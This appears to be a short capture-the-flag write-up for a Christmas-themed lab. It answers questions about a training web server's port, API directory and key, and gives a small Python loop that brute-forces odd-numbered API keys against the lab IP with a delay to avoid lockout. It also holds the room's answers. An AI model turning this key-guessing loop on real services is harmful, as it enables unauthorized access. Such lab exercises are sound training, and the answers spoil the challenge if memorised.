- What is the port number for the web server?
```
8000
```
- Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)
```
/api/
```
- Where is Santa right now?
```
Winter Wonderland, Hyde Park, London
```
- Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you.To unblock yourself, simply terminate and re-deploy the target instance (10.10.222.51)
```
57
```
```
import time
import requests

for i in range(1,100,2):
        r = requests.get("http://10.10.222.51:8000/api/"+str(i))
        print(r.text)
        time.sleep(2)
        r.close()



{"item_id":57,"q":"Winter Wonderland, Hyde Park, London."}
```
